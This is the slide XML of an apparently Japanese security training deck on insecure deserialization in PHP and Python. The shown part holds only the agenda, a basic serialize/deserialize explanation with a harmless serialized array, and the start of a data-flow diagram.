        <p:spPr>
          <a:xfrm>
            <a:off x="1504950" y="2657971"/>
            <a:ext cx="1790155" cy="223441"/>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1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HTBankケーススタディ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1504950" y="2881412"/>
            <a:ext cx="2085618" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Object Injection・反射型XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6175375" y="2476996"/>
            <a:ext cx="5200650" cy="780951"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10977"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6381750" y="2657971"/>
            <a:ext cx="406400"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6864350" y="2657971"/>
            <a:ext cx="1913812" cy="223441"/>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1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RCEとガジェットチェーン</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6864350" y="2881412"/>
            <a:ext cx="2229683" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>マジックメソッド・PHPGGC・PHAR</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="3416697"/>
            <a:ext cx="5200650" cy="780951"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10977"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="3597672"/>
            <a:ext cx="406400"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1504950" y="3597672"/>
            <a:ext cx="2151102" cy="223441"/>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1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Python Pickle・言語比較</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1504950" y="3821113"/>
            <a:ext cx="1846363" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ブラックボックス識別と注意点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6175375" y="3416697"/>
            <a:ext cx="5200650" cy="780951"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10977"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6381750" y="3597672"/>
            <a:ext cx="406400"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>06</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6864350" y="3597672"/>
            <a:ext cx="2374304" cy="223441"/>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1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>まとめとチェックリスト</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6864350" y="3821113"/>
            <a:ext cx="2766179" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>よくある誤り・実務チェックリスト・参考資料</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="6238280"/>
            <a:ext cx="313003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179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>演習A〜Dは講師用ガイド（別紙）で実施</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6F2"/>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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>復習：シリアライズとは</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1508720"/>
            <a:ext cx="5181600" cy="3873599"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2623"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1041400" y="1737320"/>
            <a:ext cx="4866132" cy="223441"/>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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Serialize</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1041400" y="2024261"/>
            <a:ext cx="4866132" cy="2540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B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>メモリ上のオブジェクトをバイト列に変換し、保存・送信可能にする</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1044575" y="2344936"/>
            <a:ext cx="4718050" cy="405110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14891"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="87106" tIns="87106" rIns="0" bIns="61706" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>a:3:{i:0;s:3:"HTB";i:1;i:123;i:2;d:7.77;}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6197600" y="1508720"/>
            <a:ext cx="5181600" cy="3873599"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2623"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6426200" y="1737320"/>
            <a:ext cx="4866132" cy="223441"/>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3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Deserialize</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6426200" y="2024261"/>
            <a:ext cx="4866132" cy="2540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B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>バイト列を取得し、元のオブジェクトをメモリ上に再構築する（逆操作）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6429375" y="2344936"/>
            <a:ext cx="4718050" cy="405110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14891"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="87106" tIns="87106" rIns="0" bIns="61706" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>unserialize($data) → object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="5610920"/>
            <a:ext cx="10883392"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058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>対応言語（一例）：Java / Ruby / PHP / Python / C# ── 本資料は PHP と Python に焦点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="6238280"/>
            <a:ext cx="164603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179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01 / 基礎とデータフロー</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6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>データフロー：Serialize → Deserialize</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1308100" y="1704280"/>
            <a:ext cx="1016000" cy="635000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1423690" y="2402780"/>
            <a:ext cx="784721" cy="416520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>オブジェクト</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>（アプリ内）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 1" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2641600" y="2210991"/>
            <a:ext cx="457200" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 2" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3289300" y="1802110"/>
            <a:ext cx="1270000" cy="635000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3540691" y="2500610"/>
            <a:ext cx="767120" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>serialize()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 3" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4749800" y="2210991"/>
            <a:ext cx="457200" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 4" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
